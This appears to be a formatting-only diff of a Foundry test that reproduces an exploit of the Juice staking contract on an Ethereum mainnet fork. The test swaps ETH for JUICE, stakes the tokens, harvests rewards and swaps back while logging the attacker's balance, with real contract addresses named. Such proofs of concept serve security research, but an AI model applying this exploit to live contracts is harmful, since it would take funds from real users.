@@ -17,29 +17,27 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // Vulnerable Contract Code : https://etherscan.io/address/0x8584ddbd1e28bca4bc6fb96bafe39f850301940e#code
 
 interface IStake {
+
     function harvest(uint256) external;
     function stake(uint256, uint256) external;
+
 }
 
 contract Juice is Test {
+
     uint256 blocknumToForkFrom = 19_395_636;
     IERC20 JUICE = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IStake JuiceStaking = IStake(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
 
-    IUniswapV2Router Router =
-        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
 
     function setUp() public {
         vm.createSelectFork("mainnet", blocknumToForkFrom);
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "[Start] Attacker ETH balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", address(this).balance, 18);
 
         //stake 0.5 ETH
         ETHtoJUICE(0.5 ether);
@@ -54,20 +52,16 @@ contract Juice is Test {
         JUICEtoETH();
 
         // Log balances after exploit
-        emit log_named_decimal_uint(
-            "[End] Attacker ETH Balance After exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker ETH Balance After exploit", address(this).balance, 18);
     }
 
     function ETHtoJUICE(uint256 amount) internal {
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(JUICE);
-        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{
-            value: amount
-        }(0, path, address(this), block.timestamp + 60);
+        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
+            0, path, address(this), block.timestamp + 60
+        );
     }
 
     function JUICEtoETH() internal {
@@ -75,14 +69,11 @@ contract Juice is Test {
         path[0] = address(JUICE);
         path[1] = address(WETH);
         Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            JUICE.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 60
+            JUICE.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
         );
     }
 
     fallback() external payable {}
     receive() external payable {}
+
 }
